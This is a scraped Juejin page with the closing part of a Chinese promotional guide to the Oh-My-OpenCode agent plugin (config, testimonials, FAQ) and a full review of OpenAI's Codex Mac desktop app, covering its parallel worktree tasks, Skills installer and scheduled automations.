      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"project-specific-model"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>项目级配置优先级高于用户级配置。</p>
<h4 data-id="heading-38">环境变量</h4>
<p>支持通过环境变量配置：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">export</span> OMO_MAX_CONCURRENT=10
<span class="hljs-built_in">export</span> OMO_DEBUG=<span class="hljs-literal">true</span>
</code></pre>
<hr/>
<h3 data-id="heading-39">📈 真实案例</h3>
<h4 data-id="heading-40">案例 1：清理 8000 个 ESLint 警告</h4>
<blockquote>
<p>"用 Oh My Opencode 仅用一天就清理了 8000 个 eslint 警告" — Jacob Ferrari</p>
</blockquote>
<p><strong>工作原理：</strong></p>
<ol>
<li>Sisyphus 启动并行 explore 代理分析项目结构</li>
<li>利用 AST-Grep 进行语义级别的搜索和替换</li>
<li>LSP 确保重构的确定性</li>
<li>Todo 执行器强制完成所有警告的修复</li>
</ol>
<h4 data-id="heading-41">案例 2：45k 行 Tauri 应用 → SaaS Web 应用</h4>
<blockquote>
<p>"我使用 ohmyopencode 和 ralph loop 在一夜之间将一个 45k 行的 tauri 应用转换成了 SaaS Web 应用。从访谈提示开始，要求它对问题进行评分和建议。看着它工作非常精彩，今早醒来发现网站基本上已经可以运行了！" — James Hargis</p>
</blockquote>
<p><strong>工作原理：</strong></p>
<ol>
<li>Prometheus 制定详细迁移计划</li>
<li>Hephaestus 自主深度工作者端到端完成</li>
<li>多个并行智能体协作</li>
<li>上下文智能管理处理大项目</li>
</ol>
<h4 data-id="heading-42">案例 3：3 个月的工作 → 7 天 → 1 小时</h4>
<blockquote>
<p>"如果 Claude Code 能在 7 天内完成人类 3 个月的工作，那么 Sisyphus 只需 1 小时。它会持续工作直到任务完成。它是一个非常自律的智能体。" — B, 量化研究员</p>
</blockquote>
<p><strong>关键因素：</strong></p>
<ul>
<li>Todo 执行器强制完成</li>
<li>并行智能体加速</li>
<li>LSP/AST 工具提升精度</li>
<li>上下文智能管理</li>
</ul>
<hr/>
<h3 data-id="heading-43">🎯 用户评价</h3>
<blockquote>
<p>"它让我取消了 Cursor 订阅。开源社区正在发生令人难以置信的事情。" — Arthur Guiot</p>
</blockquote>
<blockquote>
<p>"我还没能准确表达出它为什么如此出色，但开发体验已经达到了一个完全不同的维度。" — 苔硯:こけすずり</p>
</blockquote>
<blockquote>
<p>"用了 oh-my-opencode，你再也不会回头了" — d0t3ch</p>
</blockquote>
<blockquote>
<p>"你们应该把这个合并到核心代码并招募他。认真的。这真的非常非常非常好。" — Henning Kilset</p>
</blockquote>
<blockquote>
<p>"如果你能说服他的话就雇用 @yeon_gyu_kim，这个人彻底革新了 opencod" — [截断]</p>
</blockquote>
<hr/>
<h3 data-id="heading-44">⚠️ 常见问题与解决方案</h3>
<h4 data-id="heading-45">Q1: 为什么选择 oh-my-opencode 而不是其他插件？</h4>
<p><strong>A:</strong></p>
<ul>
<li>✅ <strong>完整的智能体团队</strong>，不只是工具集合</li>
<li>✅ <strong>Hephaestus 自主深度工作者</strong>，目标导向执行</li>
<li>✅ <strong>Todo 执行器</strong>，强制完成任务</li>
<li>✅ <strong>LSP/AST 支持</strong>，确定性重构</li>
<li>✅ <strong>开箱即用</strong>，无需复杂配置</li>
<li>✅ <strong>24,000 美元 token 的实战经验</strong>融入</li>
</ul>
<h4 data-id="heading-46">Q2: 如何切换模型？</h4>
<p>在 <code>oh-my-opencode.json</code> 中修改对应 agent 或 category 的 model 字段：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"agents"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"sisyphus"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"your-preferred-model"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-47">Q3: 如何添加新 MCP 插件？</h4>
<p>在 <code>opencode.json</code> 的 <code>mcp</code> 字段中添加：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"mcp"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"your-mcp"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"your-command"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"local"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-48">Q4: 如何调试配置？</h4>
<p>启用调试模式：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"debug"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>或在环境变量中设置：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">export</span> OMO_DEBUG=<span class="hljs-literal">true</span>
</code></pre>
<h4 data-id="heading-49">Q5: 如何优化性能？</h4>
<ol>
<li><strong>使用 Gemini 3 Flash 处理大文件</strong>（100万+ tokens）</li>
<li><strong>合理设置并发限制</strong>：<code>max_concurrent</code></li>
<li><strong>利用并行智能体</strong>：系统自动管理</li>
<li><strong>使用 LSP 重构</strong>：比文本替换更精确</li>
</ol>
<hr/>
<h3 data-id="heading-50">📋 总结</h3>
<h4 data-id="heading-51">Oh-My-OpenCode 的核心价值</h4>

















































<table><thead><tr><th>特性</th><th>价值</th></tr></thead><tbody><tr><td><strong>Sisyphus 主智能体</strong></td><td>像你的团队一样编码</td></tr><tr><td><strong>专业智能体团队</strong></td><td>各司其职，协作高效</td></tr><tr><td><strong>Hephaestus 自主工作者</strong></td><td>目标导向，自主决策</td></tr><tr><td><strong>ultrawork 魔法词</strong></td><td>一键启动高级功能</td></tr><tr><td><strong>并行智能体</strong></td><td>像真正的开发团队</td></tr><tr><td><strong>Todo 执行器</strong></td><td>强制完成任务</td></tr><tr><td><strong>LSP/AST 工具</strong></td><td>确定性重构</td></tr><tr><td><strong>上下文智能管理</strong></td><td>多智能体分担负担</td></tr><tr><td><strong>开箱即用</strong></td><td>默认启用所有功能</td></tr><tr><td><strong>精选 MCP</strong></td><td>Exa、Context7、Grep.app</td></tr></tbody></table>
<h4 data-id="heading-52">与其他工具的对比</h4>













































<table><thead><tr><th>特性</th><th>Oh-My-OpenCode</th><th>其他工具</th></tr></thead><tbody><tr><td>智能体团队</td><td>✅ 完整团队</td><td>❌ 单一智能体</td></tr><tr><td>并行执行</td><td>✅ 后台智能体</td><td>❌ 串行执行</td></tr><tr><td>强制完成</td><td>✅ Todo 执行器</td><td>❌ 可能半途而废</td></tr><tr><td>LSP/AST</td><td>✅ 完整支持</td><td>❌ 文本匹配</td></tr><tr><td>上下文管理</td><td>✅ 多智能体分担</td><td>❌ 单智能体负担</td></tr><tr><td>开箱即用</td><td>✅ 默认启用</td><td>❌ 需要复杂配置</td></tr><tr><td>开源</td><td>✅ MIT 许可证</td><td>⚠️ 闭源/部分开源</td></tr></tbody></table>
<h4 data-id="heading-53">下一步建议</h4>
<ol>
<li><strong>直接安装就行</strong>：添加插件到 <code>opencode.json</code></li>
<li><strong>使用 <code>ulw</code> 魔法词</strong>：一键启动高级功能</li>
<li><strong>尝试不同的智能体组合</strong>：根据项目需求调整</li>
<li><strong>探索 MCP 插件</strong>：扩展 AI 能力</li>
<li><strong>加入社区</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdiscord.gg%2FPUwSMR9XNk" target="_blank" title="https://discord.gg/PUwSMR9XNk" ref="nofollow noopener noreferrer">Discord</a></li>
</ol>
<h4 data-id="heading-54">资源链接</h4>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcode-yeongyu%2Foh-my-opencode" target="_blank" title="https://github.com/code-yeongyu/oh-my-opencode" ref="nofollow noopener noreferrer">Oh-My-OpenCode GitHub</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fopencode.ai" target="_blank" title="https://opencode.ai" ref="nofollow noopener noreferrer">OpenCode 官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmodelcontextprotocol.io" target="_blank" title="https://modelcontextprotocol.io" ref="nofollow noopener noreferrer">MCP 协议规范</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdiscord.gg%2FPUwSMR9XNk" target="_blank" title="https://discord.gg/PUwSMR9XNk" ref="nofollow noopener noreferrer">Discord 社区</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcode-yeongyu%2Foh-my-opencode%2Fblob%2Fdev%2Fdocs%2Fultrawork-manifesto.md" target="_blank" title="https://github.com/code-yeongyu/oh-my-opencode/blob/dev/docs/ultrawork-manifesto.md" ref="nofollow noopener noreferrer">Ultrawork Manifesto</a></li>
</ul>
<hr/>
<h3 data-id="heading-55">🎓 作者札记</h3>
<blockquote>
<p><strong>OpenCode 是 Debian/Arch，Oh-My-OpenCode 就是 Ubuntu。</strong></p>
</blockquote>
<p>我纯粹为个人开发使用了价值 <strong>24,000 美元 token 的 LLM</strong>。
尝试了每一个工具，把它们配置到极致。但始终是 OpenCode 胜出。</p>
<p>我遇到的每个问题的答案都融入了这个插件。直接安装使用。</p>
<p><strong>不要再为智能体工具的选择而烦恼了。</strong>
<strong>我会进行研究，借鉴最好的，然后发布更新。</strong></p>
<hr/>
<p><strong>警告</strong>：生产力可能飙升太快。别让你的同事发现。</p>
<blockquote>
<p>其实，我会传播这个消息。让我们看看谁会赢。</p>
</blockquote>
<hr/>
<p><strong>如果这篇文章对你有帮助，欢迎点赞、收藏、评论！有问题也欢迎在评论区讨论～</strong></p>
<p><strong>别忘了使用 <code>ulw</code> 魔法词，让智能体像真正的开发团队一样工作！</strong></p>
<p>#AI编程 #OpenCode #OhMyOpenCode #Claude #开发工具 #Sisyphus #智能体 #编程助手</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Codex出Mac桌面版了，Skills和自动化任务比想象中好用，我要抛弃Codex CLI了]]></title>    <link>https://juejin.cn/post/7602252722373165107</link>    <guid>https://juejin.cn/post/7602252722373165107</guid>    <pubDate>2026-02-03T04:28:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602252722373165107" data-draft-id="7602154088477114406" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Codex出Mac桌面版了，Skills和自动化任务比想象中好用，我要抛弃Codex CLI了"/> <meta itemprop="keywords" content="AI编程"/> <meta itemprop="datePublished" content="2026-02-03T04:28:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="子昕AI编程"/> <meta itemprop="url" content="https://juejin.cn/user/3273679891602858"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Codex出Mac桌面版了，Skills和自动化任务比想象中好用，我要抛弃Codex CLI了
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3273679891602858/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    子昕AI编程
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T04:28:28.000Z" title="Tue Feb 03 2026 04:28:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>大家好，我是子昕，一个干了10年的后端开发，现在在AI编程这条路上边冲边摸索，每天都被新技术追着跑。</p>
</blockquote>
<p>OpenAI发布了Codex桌面应用的Mac版本，奥特曼亲自在社交媒体上宣布。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/16378f958a01433d8e95fa35a160530e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2Q5piVQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697707&amp;x-signature=6nV9JUaKmTCYiL7iDCDBLJ7QRGs%3D" alt="图片" loading="lazy"/></p>
<p>说实话，看到这个消息我第一反应是：CLI不是挺好用的吗，干嘛还要出个桌面版？</p>
<p>直到我装上体验了一圈，才发现这个应用解决的问题确实是CLI做不到的——<strong>同时管理多个AI编码任务，而且互不干扰</strong>。</p>
<p>简单说，CLI是你和一个AI助手对话，桌面版是你指挥一个AI团队干活。</p>
<h2 data-id="heading-0">核心要点</h2>
<ul>
<li>现在只有Mac版，Windows版后续推出</li>
<li>支持多任务并行，每个任务用worktree隔离</li>
<li>内置Skills系统，可以安装第三方技能</li>
<li>自动化任务可以定时执行</li>
<li>为庆祝发布，所有付费用户流量限制翻倍两个月</li>
<li>免费用户限时也能用</li>
</ul>
<h2 data-id="heading-1">为啥要出桌面版</h2>
<p>OpenAI的逻辑其实挺清楚：</p>
<p>Codex CLI推出后，大家发现AI已经能处理越来越复杂的任务了。但问题是，当你想同时让AI做几件事的时候，CLI就不够用了——你得开好几个终端窗口，手动管理不同的分支，很容易乱套。</p>
<p>桌面版就是为了解决这个问题。它的定位是<code>AI智能体指挥中心</code>，让你能像项目经理一样，把不同的任务分配给不同的AI，然后统一查看进度和结果。</p>
<h2 data-id="heading-2">实际体验</h2>
<h3 data-id="heading-3">1. 新建会话</h3>
<p>打开应用后，可以同时把你之前的多个项目都添加进来，每个项目之前在Codex CLI或者idea插件上的会话历史，都会自动同步过来。</p>
<p>然后给项目新建一个会话，这个会话可以选择已经添加到应用的项目，也可以添加新的项目。</p>
<p>创建会话这个流程和Codex CLI差不多。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f82f8ed6827f4c7f91f5597a948b3c98~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2Q5piVQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697707&amp;x-signature=57OUCj9AnJ9YojKiKjYxOopgi3I%3D" alt="新建会话截图展示" loading="lazy"/></p>
<p>新建会话截图展示</p>
<p>如果你的项目是git仓库，每次Codex改代码，都能看到详细的diff记录。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9761e3c9a4384c078afce9c2d2985c37~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2Q5piVQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697707&amp;x-signature=DODYlmuZFiL%2B3z5bJUVXrblMZuE%3D" alt="图片" loading="lazy"/></p>
<p>这个功能很多人应该期待挺久了，终于有了。</p>
<p>更关键的是<strong>worktree支持</strong>。</p>
<p>简单说，就是每个任务都在独立的分支和工作目录里跑，互不影响。你可以同时让一个AI修bug，另一个AI写新功能，第三个AI做性能优化，完全不会冲突。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6bdf78a6b6f4631a33703cdecad1b94~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2Q5piVQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697707&amp;x-signature=bQ%2F546B8Tc8seBn%2FJ0MX09XEbtA%3D" alt="使用worktree创建并行任务" loading="lazy"/></p>
<p>使用worktree创建并行任务</p>
<h3 data-id="heading-4">2. Skills系统</h3>
<p>Codex应用内置了一堆Skills，点击加号就能安装。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09339a20d1fb466fb685d930c9ba25e6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2Q5piVQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697707&amp;x-signature=E4LvZyI3ur4EB3%2BBWypaLqZi5xw%3D" alt="codex应用内置Skills列表" loading="lazy"/></p>
<p>codex应用内置Skills列表</p>
<p>安装后点编辑图标就能用：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/518e69371097447890c002e54942914c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2Q5piVQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697707&amp;x-signature=wv7f4fXp0LxeikD67m99x4rKnxQ%3D" alt="图片" loading="lazy"/></p>
<p>Codex应用预装了两个skill：<strong>Skill Installer</strong> 和 <strong>Skill Creator</strong>。</p>
<p>Skill Installer是用来装新技能的。有三种装法：</p>
<ul>
<li>直接按名称装官方精选技能：</li>
</ul>

<pre><code class="hljs language-bash" lang="bash"><span class="hljs-variable">$skill</span>-installer gh-address-comments
</code></pre>
<ul>
<li>从实验文件夹装：</li>
</ul>

<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$skill</span>-installer install the create-plan skill <span class="hljs-keyword">from</span> the .experimental folder
</code></pre>
<ul>
<li>用GitHub URL装(这个厉害了，可以装第三方的)：</li>
</ul>

<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-variable">$skill</span>-installer install <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/github.com/openai</span><span class="hljs-regexp">/skills/tree</span><span class="hljs-regexp">/main/skills</span><span class="hljs-regexp">/.experimental/create</span>-plan
</code></pre>
<p>我试了下用GitHub URL装一个非官方的Skill：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/913f59058b2f4b7eb59ef6b130e3a8a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2Q5piVQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697707&amp;x-signature=7J9Kr%2FuewQxndT91kV7dPHJU0HU%3D" alt="图片" loading="lazy"/></p>
<p>选择技能后直接粘贴地址：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9a0f44de253049e69a9560f0b8b77d13~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2Q5piVQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697707&amp;x-signature=flMAQBX02ug8y4EW7AIe9NKbe1Q%3D" alt="图片" loading="lazy"/></p>
<p>装完重启应用就能看到新技能了：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/734bede28fff497abe3836d7ce26d0b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2Q5piVQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697707&amp;x-signature=rfQLHASZJY7gnHdiXIpVrtvWY9o%3D" alt="图片" loading="lazy"/></p>
<p>而且这个第三方Skill用起来也没问题：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c6c8087507864a0fb19ccce5134531bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2Q5piVQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697707&amp;x-signature=gezRAzWWfl89CjGTjUP%2BwJtj2rU%3D" alt="图片" loading="lazy"/><br/>
Skill Creator 则是用来辅助我们创建 Skill 技能的，这里就不赘述了，感兴趣的可以自行尝试一下。</p>
<h3 data-id="heading-5">3. 自动化任务</h3>
<p>应用还内置了自动化功能，可以设置定时任务。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/70f1b6a1f4054c50b8e1c988c8865dfc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2Q5piVQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697707&amp;x-signature=vjxg4x4IID3tloFsHsUTIBP4N%2Fk%3D" alt="图片" loading="lazy"/></p>
<p>配置很简单：任务名、项目、需求描述，然后选执行时间。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b6782c2a4934dfda2284d04854d0faa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2Q5piVQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697707&amp;x-signature=nTAx%2B0nLCZ7VWPlBbEaiTbGIIKY%3D" alt="图片" loading="lazy"/></p>
<p>时间可以选具体时刻，也可以每隔几小时执行，还能指定日期：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d5f3eb8e04b1438284bd950530aef99b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2Q5piVQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697707&amp;x-signature=MFi20oMTApYTBlDPsaUwhbHWemA%3D" alt="图片" loading="lazy"/></p>
<p>比如让它每天早上自动整理issue，或者每周五生成周报，这种重复性任务就很适合。</p>
<h2 data-id="heading-6">流量限制翻倍</h2>
<p>为了庆祝应用发布，奥特曼宣布所有付费计划的流量限制翻倍，持续两个月。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/773fdfa383b14d998f5bb8e742a32c97~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2Q5piVQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697707&amp;x-signature=6IfY9JBwKNeEUzmawxRd90AhKrY%3D" alt="图片" loading="lazy"/></p>
<p>这个福利适用于所有使用Codex的地方——应用、CLI、IDE插件都算。</p>
<p>而且限时期间，免费用户也能用Codex了。</p>
<h2 data-id="heading-7">总结</h2>
<p>Codex桌面版不是CLI的替代品，而是补充。</p>
<p>如果你只是想快速改几行代码，CLI够用了。但如果你需要同时推进多个任务，或者想让AI在后台自动跑一些重复性工作，桌面版就很有用。</p>
<p>现在Mac版已经可以下载了，Windows版后续也会推出。</p>
<p>值得试试。</p>
